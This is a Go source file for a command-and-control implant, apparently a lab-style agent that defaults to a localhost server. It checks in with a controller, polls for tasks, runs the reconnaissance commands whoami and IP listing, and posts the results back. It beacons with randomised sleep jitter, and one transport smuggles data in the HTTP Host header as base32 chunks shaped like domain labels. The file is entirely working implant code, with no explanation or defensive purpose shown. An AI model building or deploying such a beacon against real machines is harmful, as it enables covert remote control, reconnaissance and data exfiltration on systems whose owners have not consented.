package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base32"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type Rule struct {
	Method    string `json:"method"`
	Transport string `json:"transport"`
	Field     string `json:"field"`
}
type Config struct {
	PayloadUUID string          `json:"payload_uuid"`
	Profile     map[string]Rule `json:"profile"`
	ServerURL   string          `json:"server_url"`
}
type Task struct {
	ID      int    `json:"task_id"`
	Command string `json:"command"`
}
type Pending struct {
	Task   Task
	Result string
}
type StatusError struct {
	Code int
	Body string
}

func (e *StatusError) Error() string { return fmt.Sprintf("HTTP %d: %s", e.Code, e.Body) }

var httpClient = &http.Client{Timeout: 5 * time.Second}
var uuidPattern = regexp.MustCompile(`^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$`)

func env(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func send(method, endpoint, transport, field string, value any, payload, host, server string) (map[string]json.RawMessage, error) {
	address := strings.TrimRight(server, "/") + "/" + endpoint
	var body io.Reader
	if transport == "json" {
		data, err := json.Marshal(map[string]any{field: value})
		if err != nil {
			return nil, err
		}
		body = bytes.NewReader(data)
	} else if transport == "query" || transport == "form" {
		var text string
		if s, ok := value.(string); ok {
			text = s
		} else {
			data, err := json.Marshal(value)
			if err != nil {
				return nil, err
			}
			text = string(data)
		}
		form := url.Values{field: {text}}.Encode()
		if transport == "query" {
			address += "?" + form
		} else {
			body = strings.NewReader(form)
		}
	} else if transport != "host" {
		return nil, fmt.Errorf("unknown transport %q", transport)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, method, address, body)
	if err != nil {
		return nil, err
	}
	if payload != "" {
		req.Header.Set("X-Payload-UUID", payload)
	}
	if transport == "json" {
		req.Header.Set("Content-Type", "application/json")
	}
	if transport == "form" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if transport == "host" {
		req.Host = host
	}
	response, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	data, err := io.ReadAll(io.LimitReader(response.Body, 65537))
	if err != nil {
		return nil, err
	}
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return nil, &StatusError{response.StatusCode, string(data)}
	}
	var result map[string]json.RawMessage
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}
	return result, nil
}

func profileRequest(endpoint, operation string, value any, config Config) (map[string]json.RawMessage, error) {
	rule := config.Profile[operation]
	if rule.Transport != "host" {
		return send(rule.Method, endpoint, rule.Transport, rule.Field, value, config.PayloadUUID, "", config.ServerURL)
	}
	var text string
	if s, ok := value.(string); ok {
		text = s
	} else {
		data, err := json.Marshal(value)
		if err != nil {
			return nil, err
		}
		text = string(data)
	}
	if len(text) == 0 || len(text) > 20000 {
		return nil, errors.New("Host data must be 1..20000 UTF-8 bytes")
	}
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(text))
	count := (len(encoded) + 49) / 50
	id := make([]byte, 6)
	if _, err := rand.Read(id); err != nil {
		return nil, err
	}
	messageID := hex.EncodeToString(id)
	var result map[string]json.RawMessage
	for i := 0; i < count; i++ {
		end := (i + 1) * 50
		if end > len(encoded) {
			end = len(encoded)
		}
		host := fmt.Sprintf("m.%s.%d.%d.%s.demo.test", messageID, i+1, count, encoded[i*50:end])
		var err error
		result, err = send(rule.Method, endpoint, "host", rule.Field, value, config.PayloadUUID, host, config.ServerURL)
		if err != nil {
			return nil, err
		}
		if i < count-1 && result["received"] == nil {
			return nil, errors.New("server rejected Host part")
		}
	}
	return result, nil
}

func loadConfig(path, server, profile string) (Config, error) {
	var config Config
	data, err := os.ReadFile(path)
	if err == nil {
		if err = json.Unmarshal(data, &config); err != nil {
			return config, err
		}
		if config.ServerURL != server {
			return config, errors.New("BOT_SERVER does not match saved config")
		}
	} else if errors.Is(err, os.ErrNotExist) {
		result, err := send("POST", "payloads", "json", "profile", profile, "", "", server)
		if err != nil {
			return config, err
		}
		data, err := json.Marshal(result)
		if err != nil {
			return config, err
		}
		if err = json.Unmarshal(data, &config); err != nil {
			return config, err
		}
		config.ServerURL = server
		data, err = json.MarshalIndent(config, "", "  ")
		if err != nil {
			return config, err
		}
		if err = os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			return config, err
		}
		if err = os.WriteFile(path, data, 0600); err != nil {
			return config, err
		}
	} else {
		return config, err
	}
	if !uuidPattern.MatchString(config.PayloadUUID) {
		return config, errors.New("invalid payload UUID")
	}
	for _, op := range []string{"checkin", "get_task", "post_task"} {
		rule, ok := config.Profile[op]
		if !ok || (rule.Method != "GET" && rule.Method != "POST") || (rule.Transport != "json" && rule.Transport != "form" && rule.Transport != "query" && rule.Transport != "host") || strings.TrimSpace(rule.Field) == "" || len(rule.Field) > 64 {
			return config, fmt.Errorf("invalid profile rule %s", op)
		}
		if rule.Method == "GET" && rule.Transport != "query" && rule.Transport != "host" {
			return config, fmt.Errorf("invalid GET rule %s", op)
		}
	}
	return config, nil
}

func execute(command string) (string, error) {
	switch command {
	case "whoami":
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		program := "whoami"
		if root := os.Getenv("SystemRoot"); root != "" {
			program = filepath.Join(root, "System32", "whoami.exe")
		}
		output, err := exec.CommandContext(ctx, program).Output()
		return strings.TrimSpace(string(output)), err
	case "ip":
		interfaces, err := net.Interfaces()
		if err != nil {
			return "", err
		}
		var lines []string
		for _, iface := range interfaces {
			addresses, err := iface.Addrs()
			if err != nil {
				return "", err
			}
			for _, address := range addresses {
				ip, _, err := net.ParseCIDR(address.String())
				if err == nil && ip != nil {
					lines = append(lines, iface.Name+": "+ip.String())
				}
			}
		}
		if len(lines) == 0 {
			return "IP адресов не нашёл", nil
		}
		return strings.Join(lines, "\n"), nil
	case "exit":
		return "Выхожу", nil
	default:
		return "", errors.New("unknown command")
	}
}

func sleepDelay(base, jitter float64) {
	n, err := rand.Int(rand.Reader, big.NewInt(1000000))
	if err != nil {
		time.Sleep(time.Duration(base * float64(time.Second)))
		return
	}
	factor := 1 + ((float64(n.Int64())/999999)*2-1)*jitter
	time.Sleep(time.Duration(math.Max(0.1, base*factor) * float64(time.Second)))
}

func run() error {
	server := env("BOT_SERVER", "http://127.0.0.1:5000")
	profile := env("BOT_PROFILE", "standard")
	if profile != "standard" && profile != "mixed" && profile != "host" {
		return errors.New("BOT_PROFILE must be standard, mixed or host")
	}
	base, err := strconv.ParseFloat(env("BOT_SLEEP", "5"), 64)
	if err != nil || base <= 0 {
		return errors.New("invalid BOT_SLEEP")
	}
	jitter, err := strconv.ParseFloat(env("BOT_JITTER", "0.3"), 64)
	if err != nil {
		return errors.New("invalid BOT_JITTER")
	}
	jitter = math.Max(0, math.Min(1, jitter))
	path := env("BOT_CONFIG", "payload-"+profile+".json")
	config, err := loadConfig(path, server, profile)
	if err != nil {
		return err
	}
	fmt.Printf("Config: %s Payload: %s\n", path, config.PayloadUUID)
	response, err := profileRequest("checkin", "checkin", config.PayloadUUID, config)
	if err != nil {
		return err
	}
	var callback string
	if err = json.Unmarshal(response["callback_uuid"], &callback); err != nil || !uuidPattern.MatchString(callback) {
		return errors.New("invalid callback UUID")
	}
	fmt.Println("Callback:", callback)
	var pending *Pending
	for {
		if pending == nil {
			response, err = profileRequest("poll", "get_task", callback, config)
			if err == nil && string(response["task"]) != "null" {
				var task Task
				err = json.Unmarshal(response["task"], &task)
				if err == nil {
					fmt.Printf("Task: %d %s\n", task.ID, task.Command)
					result, commandErr := execute(task.Command)
					if commandErr != nil {
						result = "Ошибка: " + commandErr.Error()
					}
					runes := []rune(result)
					if len(runes) > 20000 {
						result = string(runes[:20000])
					}
					pending = &Pending{task, result}
				}
			}
		}
		if err == nil && pending != nil {
			_, err = profileRequest("results", "post_task", map[string]any{"callback_uuid": callback, "task_id": pending.Task.ID, "result": pending.Result}, config)
			if err == nil {
				fmt.Println("Result sent:", pending.Task.ID)
				if pending.Task.Command == "exit" {
					return nil
				}
				pending = nil
			}
		}
		if err != nil {
			var status *StatusError
			if errors.As(err, &status) && status.Code >= 400 && status.Code < 500 {
				return err
			}
			fmt.Println("Connection failed, retrying:", err)
		}
		sleepDelay(base, jitter)
	}
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
